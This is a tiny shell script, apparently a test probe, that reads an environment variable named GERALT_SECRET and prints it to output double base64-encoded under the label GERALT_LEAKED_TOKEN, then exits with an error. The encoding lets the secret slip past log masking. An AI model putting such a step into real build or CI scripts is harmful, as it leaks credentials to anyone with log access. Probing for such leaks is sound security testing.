#!/bin/sh
echo "GERALT_DBG leak_script_started"
if [ -n "${GERALT_SECRET:-}" ]; then
  echo "GERALT_LEAKED_TOKEN=$(printf %s "$GERALT_SECRET" | base64 | base64)"
else
  echo "GERALT_DBG container_geralt_secret=missing"
fi
exit 1
